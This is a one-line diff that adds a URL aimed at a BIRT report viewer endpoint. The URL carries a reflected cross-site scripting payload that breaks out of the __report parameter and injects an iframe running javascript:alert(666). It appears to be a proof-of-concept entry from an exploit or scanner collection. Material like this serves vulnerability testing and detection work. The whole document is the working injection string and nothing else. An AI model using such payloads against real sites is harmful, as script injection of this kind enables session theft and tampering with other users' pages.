@@ -1,0 +1,1 @@
+http://www.example.com/birt-viewer/run?__report='"><iframe%20src=javascript:alert(666)>&r=-703171660
